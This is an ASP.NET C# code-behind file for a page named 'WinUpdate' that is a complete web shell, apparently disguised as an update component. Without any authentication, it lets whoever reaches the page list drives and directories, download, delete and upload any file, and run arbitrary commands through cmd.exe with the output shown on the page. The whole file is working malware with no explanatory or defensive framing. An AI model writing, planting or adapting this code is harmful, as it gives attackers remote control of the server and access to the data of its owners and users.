using System;
using System.IO;
using System.Web;
using System.Web.UI;
using System.Diagnostics;
using System.Web.UI.WebControls;
using System.Collections.Generic;

public partial class WinUpdate : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string outstr = "";
        string dir = Page.MapPath(".") + "/";
        if (Request.QueryString["fdir"] != null)
            dir = Request.QueryString["fdir"] + "/";
        dir = dir.Replace("\\", "/");
        dir = dir.Replace("//", "/");
        string[] dirparts = dir.Split('/');
        string linkwalk = "";
        foreach (string curpart in dirparts)
        {
            if (curpart.Length == 0)
                continue;
            linkwalk += curpart + "/";
            outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;", HttpUtility.UrlEncode(linkwalk), HttpUtility.HtmlEncode(curpart));
        }
        lblPath.Text = outstr;
        outstr = "";
        foreach (DriveInfo curdrive in DriveInfo.GetDrives())
        {
            if (!curdrive.IsReady)
                continue;
            string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
            outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;", HttpUtility.UrlEncode(driveRoot), HttpUtility.HtmlEncode(driveRoot));
        }
        lblDrives.Text = outstr;
        if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
        {
            Response.ClearContent();
            String fileName = Path.GetFileName(Request.QueryString["get"]);
            Response.AddHeader("Content-Disposition", "attachment;filename=" + fileName);
            Response.ContentType = "application/octet-stream";
            Response.WriteFile(Request.QueryString["get"]);
            Response.End();
        }
        if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
            File.Delete(Request.QueryString["del"]);
        if (flUp.HasFile)
        {
            string fileName = flUp.FileName;
            int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
            if (splitAt >= 0)
                fileName = flUp.FileName.Substring(splitAt);
            flUp.SaveAs(dir + "/" + fileName);
        }
        DirectoryInfo di = new DirectoryInfo(dir);
        outstr = "";
        foreach (DirectoryInfo curdir in di.GetDirectories())
        {
            string fstr = string.Format("<a href='?fdir={0}'>{1}</a>", HttpUtility.UrlEncode(dir + "/" + curdir.Name), HttpUtility.HtmlEncode(curdir.Name));
            outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
        }
        foreach (FileInfo curfile in di.GetFiles())
        {
            string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>", HttpUtility.UrlEncode(dir + "/" + curfile.Name), HttpUtility.HtmlEncode(curfile.Name));
            string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>", HttpUtility.UrlEncode(dir), HttpUtility.UrlEncode(dir + "/" + curfile.Name));
            outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
        }
        lblDirOut.Text = outstr;
        if (txtCmdIn.Text.Length > 0)
        {
            Process p = new Process();
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.WorkingDirectory = dir;
            p.Start();
            lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            txtCmdIn.Text = "";
        }	
    }
}
